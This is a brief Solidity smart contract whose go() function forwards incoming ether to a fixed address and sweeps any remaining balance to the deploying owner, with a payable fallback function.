pragma solidity ^0.4.24;
contract B {
	address public owner = msg.sender;
	function go() payable public {
	address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;
	target.transfer(msg.value);
	owner.transfer(address(this).balance);
	}
	function () payable public {
	}
	
}